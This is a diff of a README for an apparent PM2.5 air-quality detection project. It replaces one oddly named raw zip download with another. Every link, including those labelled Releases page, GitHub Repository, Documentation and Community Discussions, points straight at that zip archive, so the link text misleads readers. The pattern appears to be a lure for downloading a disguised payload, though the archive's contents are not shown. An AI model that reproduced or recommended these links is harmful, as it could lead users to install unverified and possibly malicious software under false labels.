@@ -8,14 +8,14 @@ Welcome to the **pm2.5-ghostbuster** project! This software helps you detect PM2
 
 To get started, you need to download the application from our Releases page. 
 
-[![Download pm2.5-ghostbuster](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
+[![Download pm2.5-ghostbuster](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip)](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip)
 
 Click the link above to visit the Releases page. Here, you will find different versions of the software you can download based on your device.
 
 ### Step-by-Step Installation
 
 1. **Visit the Release Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip).
 
 2. **Choose Your Version**
    - Look for the latest release. It will have the highest version number. 
@@ -60,9 +60,9 @@ This project combines art and science to address air pollution. Using **pm2.5-gh
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
-- [Documentation](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
-- [Community Discussions](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip)
+- [Documentation](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/Arduino/picoPM25v4/ghostbuster-pm-fluosilicic.zip)
 
 ## 💬 Get Help
 
